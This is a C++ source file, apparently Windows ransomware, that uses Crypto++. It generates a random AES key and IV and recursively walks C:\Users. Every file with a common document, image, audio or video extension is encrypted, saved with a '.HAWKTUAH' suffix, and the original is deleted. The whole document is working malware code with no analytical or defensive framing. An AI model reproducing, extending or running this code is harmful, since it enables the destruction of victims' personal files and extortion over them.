#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <cryptlib.h>
#include <aes.h>
#include <modes.h>
#include <osrng.h>
#include <files.h>
#include <hex.h>
#include <Windows.h>
#include <thread>

namespace fs = std::filesystem;
using namespace std;

typedef unsigned char Byte;
typedef Byte cs_byte;

string savedkey;
string savediv;

void EncryptFile(const fs::path& filePath, const std::string& key, const std::string& iv) {
    try {
        // Read the file contents
        std::ifstream inputFile(filePath, std::ios::binary);
        if (!inputFile.is_open()) {
            cout << "error" << endl;
        }

        std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(inputFile)),
            std::istreambuf_iterator<char>());
        inputFile.close();

        // Encrypt the file contents
        std::vector<unsigned char> encryptedData;
        CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor((Byte*)key.data(), key.size(), (Byte*)iv.data());

        CryptoPP::StringSource ss(
            fileData.data(), fileData.size(), true,
            new CryptoPP::StreamTransformationFilter(
                encryptor,
                new CryptoPP::VectorSink(encryptedData)
            )
        );

        // Write encrypted data back to a file
        std::ofstream outputFile(filePath.string() + ".HAWKTUAH", std::ios::binary);

        if (!outputFile.is_open()) {
            cout << "error" << endl;
        }

        outputFile.write((char*)encryptedData.data(), encryptedData.size());
        outputFile.close();
        fs::remove(filePath);
    }
    catch (const std::exception &ex) {
        cout << "error" << endl;
    }
}

void ScanAndEncryptDirectory(const std::wstring& directory, const std::string& key, const std::string& iv) {
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        //if (entry.is_regular_file()) {
        const auto& path = entry.path();
        auto extension = path.extension().string();

        // Check for specific file extensions
        if (extension == ".png" || extension == ".jpg" || extension == ".txt" || extension == ".pdf" || extension == ".bmp" || extension == ".psd" || extension == ".webp" || extension == ".ink" || extension == ".doc" || extension == ".docx" || extension == ".xlsx" || extension == ".mp3" || extension == ".ogg" || extension == ".wav" || extension == ".mp4" || extension == ".wmv") {
            EncryptFile(path, key, iv);
        }
        //}
    }
}


int encrypt() {

    wstring directory = L"C:\\Users";
    // Generate a random AES key and IV
    CryptoPP::AutoSeededRandomPool rng;
    std::string key(CryptoPP::AES::DEFAULT_KEYLENGTH, 0);
    std::string iv(CryptoPP::AES::BLOCKSIZE, 0);
    rng.GenerateBlock((Byte*)key.data(), key.size());
    rng.GenerateBlock((Byte*)iv.data(), iv.size());
    savedkey = key;
    savediv = iv;

    ScanAndEncryptDirectory(directory, key, iv);

    return 0;
}
